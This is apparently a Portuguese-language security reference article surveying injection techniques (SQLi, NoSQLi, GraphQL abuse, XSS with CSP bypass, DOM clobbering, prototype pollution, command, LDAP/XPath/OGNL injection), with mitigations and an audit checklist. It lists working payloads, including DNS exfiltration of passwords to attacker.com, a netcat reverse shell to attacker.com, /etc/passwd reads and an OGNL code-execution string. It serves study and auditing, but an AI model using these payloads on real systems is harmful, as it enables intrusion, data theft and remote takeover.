---
title: Injection Profundo — SQLi, NoSQLi, GraphQL, XSS+CSP bypass
category: auth
stack: [SQL, MongoDB, GraphQL, JavaScript, browser]
tags: [injection, sqli, nosqli, xss, graphql, csp]
excerpt: Além do "SELECT * FROM users WHERE name='OR 1=1'" — blind SQLi, NoSQLi, GraphQL abuse, XSS com CSP bypass e DOM clobbering.
related: [sec-server-side-attacks, sec-owasp-top10-2025, sec-broken-access-control]
updated: "2026-05-10"
---

## SQL Injection — além do clássico

Em 2026, SQLi básico (`' OR 1=1--`) é raríssimo em prod. O que aparece:

### Blind SQLi

Sem output direto, infere via boolean ou time.

```sql
-- Boolean-based: response muda baseado em condição
' AND SUBSTRING(password, 1, 1)='a'--

-- Time-based: response demora baseado em condição
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--   -- PostgreSQL
```

sqlmap automatiza: `sqlmap -u 'https://target/api?id=1' --technique=BT --batch`

### Second-order SQLi

Input salvo sanitizado, mas usado depois em query construída por concat.

```python
# Cadastro
username = sanitize(input)  # 'admin'--' vira 'admin\'--'
db.exec("INSERT INTO users (name) VALUES ('admin\\'--')")

# Mas no DB fica armazenado como: admin'--
# Update de profile:
db.exec(f"UPDATE settings SET email='x' WHERE owner='{username}'")
# Query final: UPDATE settings SET email='x' WHERE owner='admin'--'
# Atualiza TODOS os settings
```

### Out-of-band (OOB)

Sem response visível, sem timing. Exfiltra via DNS / HTTP.

```sql
-- MSSQL exemplo
'; EXEC master..xp_dirtree '//\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\\share'--
-- Resolução DNS de attacker.com revela o password
```

OOB usa Burp Collaborator ou interactsh (ProjectDiscovery).

### NoSQL injection

MongoDB e amigos sem prepared queries:

```javascript
// ❌ Vuln
db.users.findOne({ username: req.body.username, password: req.body.password })

// Atacante manda:
{ "username": "admin", "password": { "$ne": null } }
// Resultado: { username: 'admin', password: { $ne: null } } → match em qualquer password
```

```javascript
// Variantes
{ "$where": "this.password === this.username" }
{ "username": { "$regex": "^a" } }  // enum prefix por prefix
```

NoSQLi em Express + body-parser que aceita JSON sem validar tipo é endêmico. Mitigar com Joi/Zod estrito.

### GraphQL abuse

GraphQL não é "REST mais bonito" — tem superfície própria.

```graphql
# 1. Introspection enum (revela schema completo se ligado)
{ __schema { types { name fields { name type { name } } } } }

# 2. Field suggestion (ajuda atacante mesmo com introspection desligada)
{ users { naem } }   # erro: "Did you mean 'name'?"

# 3. Batching DoS
[{"query": "{ users { id } }"}, ...repetido 1000x...]

# 4. Aliasing pra bruteforce sem rate limit por field
{
  a: login(user:"admin", pass:"a") { token }
  b: login(user:"admin", pass:"b") { token }
  c: login(user:"admin", pass:"c") { token }
  ... (até 1000 aliases em 1 request)
}

# 5. Query depth bomb (DoS via nested)
{ user { friends { friends { friends { ... 10 níveis } } } } }

# 6. SQL/NoSQL injection via argumento
{ user(filter: "1' OR '1'='1") { name email } }   # backend resolve sem prepared
```

Ferramenta: **InQL** (Burp), **GraphCrawler**, **clairvoyance** (introspection forçada).

### XSS + CSP bypass

Era "alert(1)". Hoje, app moderna tem CSP. Mas CSP mal configurada cai:

```javascript
// CSP: script-src 'self' https://accounts.google.com 'unsafe-inline'
// 'unsafe-inline' = XSS clássica funciona:
<img src=x onerror="alert(1)">

// Sem 'unsafe-inline' mas com JSONP whitelist:
<script src="https://accounts.google.com/o/oauth2/auth?callback=alert(1)"></script>

// Sem JSONP mas com Angular em whitelist (legacy):
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

// 'strict-dynamic' + nonce-reflection
// Se nonce reflete em comment/header, atacante injeta:
<script nonce="{{REFLECTED_NONCE}}">alert(1)</script>

// Base tag injection (sem base-uri 'none')
<base href="https://evil.com/">
// Próximos <script src="/lib.js"> vão pra evil.com
```

### XSS — variantes além de reflected

- **Stored XSS** — salvo em DB, executa em qualquer view.
- **DOM XSS** — JS lê de `location`, `document.cookie`, `postMessage` e escreve no DOM sem sanitize. Sources: `location.hash`, `location.search`, `document.referrer`. Sinks: `innerHTML`, `outerHTML`, `eval`, `setTimeout(string)`, `Function()`.
- **Mutation XSS (mXSS)** — DOMPurify de versão antiga + parser de HTML do browser mutação = XSS escapa sanitização. Usar DOMPurify 3+.
- **Universal XSS (uXSS)** — bug no browser permite XSS em qualquer site. Raro mas devastador.

### DOM Clobbering

HTML pode criar variáveis globais. App que confia em `window.config` sem inicializar pode ser clobberado:

```html
<!-- App tem: -->
<script>
  if (window.config && window.config.api) {
    fetch(window.config.api + '/data')
  }
</script>

<!-- Atacante injeta HTML (sem script tag) -->
<form id="config"><input name="api" value="//evil.com"></form>
<!-- window.config = form, window.config.api = "//evil.com" -->
<!-- fetch vai pra evil.com -->
```

Mitigar: usar `let/const` explícito, não confiar em props criadas por HTML.

### Prototype Pollution

JS specific. Modificar `Object.prototype` afeta todos os objetos.

```javascript
// Vuln: merge recursivo sem proteção
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key] || (target[key] = {}), source[key])
    } else {
      target[key] = source[key]
    }
  }
}

// Atacante manda body:
{ "__proto__": { "isAdmin": true } }
// Agora qualquer obj.isAdmin === true até reiniciar Node
```

Lodash teve várias CVEs disso. Em Node 19+ tem `Object.freeze(Object.prototype)` como mitigação.

## Command Injection

```bash
# App roda: ping -c 4 <user_input>
$ ; cat /etc/passwd; #
$ `cat /etc/passwd`
$ $(cat /etc/passwd)
$ | nc attacker.com 4444 -e /bin/sh
$ %0acat%20/etc/passwd   # URL-encoded newline em alguns parsers
```

Variantes em diferentes contextos:
- `eval()` em Python/JS → equivalente.
- Template engines (Jinja, Twig, Handlebars) com SSTI → ver `sec-server-side-attacks`.
- Path traversal em filename (`filename=../../../etc/passwd`).

Ferramentas: **commix** automatiza.

## LDAP / XPath / OGNL Injection

```
# LDAP filter injection
user=*)(uid=*))(|(uid=*    # bypass de auth via filter manipulation

# XPath
' or '1'='1     # XPath injection clássico
' or 1=count(/users/user[contains(password,'a')])='1   # blind

# OGNL (Struts2, CVE-2017-5638 - Equifax breach)
%{(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}
```

Raros em app moderna, mas Java legacy em corporate ainda tem.

## Audit playbook por endpoint

1. Identificar todos os params (query, body, headers, cookies).
2. Cada param: testar `'`, `"`, `<`, `>`, `${{`, `{{`, `\`, `\x00`, `\n`, `' OR '1'='1`, `'><script>`, payloads OOB.
3. Observar response: erro de parser? mudança de tamanho? mudança de timing? OOB callback?
4. Caso negativo: testar segundo-order (input salvo, lido em outro endpoint).
5. GraphQL: introspection on/off? aliasing bombs? depth limit?

## Ferramentas

- **sqlmap** — SQL injection (ainda o padrão).
- **NoSQLMap** — Mongo/Couch.
- **commix** — command injection.
- **GraphQL Voyager / InQL** — GraphQL exploration.
- **DOMPurify Bypass collection** — XSS sanitizer evasion.
- **XSStrike / DalFox** — XSS automation.
- **XSSHunter Express** (self-hosted) — blind XSS callback.

## Leituras

- PayloadsAllTheThings — payloads por categoria
- PortSwigger Web Security Academy — todos os tracks
- "Bug Bounty Bootcamp" — Vickie Li (DOM clobbering, mXSS)
- "GraphQL Voyager" research — Apollo, IBM
- HackTricks injection sections
